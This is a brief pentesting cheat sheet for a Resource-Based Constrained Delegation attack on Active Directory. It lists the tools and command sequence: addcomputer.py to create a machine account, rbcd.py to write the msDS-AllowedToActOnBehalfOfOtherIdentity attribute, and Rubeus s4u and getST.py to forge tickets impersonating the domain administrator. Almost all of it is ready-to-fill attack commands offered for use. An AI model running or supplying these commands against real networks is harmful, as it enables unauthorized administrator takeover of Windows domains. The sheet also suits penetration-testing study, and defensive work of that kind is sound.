# Resource-Based Constrained Delegation (RBCD)

### Object: msDS-AllowedToActOnBehalfOfOtherIdentity

## Tools: rbcd.py , rubeus.exe , getST , addcomputer.py

#### 1) addcomputer.py

 - addcomputer.py -computer-name 'COMPUTER_NAME' -computer-pass 'COMPUTER_PASSWORD' -dc-host DC -domain-netbios DOMAIN_NETBIOS 'DOMAIN/USER:PASSWORD' (Add computer account)

#### 2) Rubeus

 - rubeus.exe hash /password:COMPUTER_PASS /user:COMPUTER /domain:DOMAIN

 - rubeus.exe s4u /user:FAKE_COMPUTER$ /aes256:AES_256_HASH /impersonateuser:administrator /msdsspn:cifs/VICTIM.DOMAIN.LOCAL /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:DOMAIN.LOCAL/ptt (System/Admin access)

#### 3) rbcd.py

 - rbcd.py -delegate-to 'COMPUTER$' -dc-ip 'DC' -action 'read' 'domain'/'USER':'PASSWORD' (Try to read the attribute)

 - rbcd.py -delegate-from 'COMPUTER$' -delegate-to 'TARGET$' -dc-ip 'DC' -action 'write' DOMAIN/USER:PASSWORD

 - getST.py -spn host/DC_FQDN 'DOMAIN/COMPUTER_ACCOUNT:COMPUTER_PASS' -impersonate Administrator --dc-ip DC_IP (Get TGT ticket)
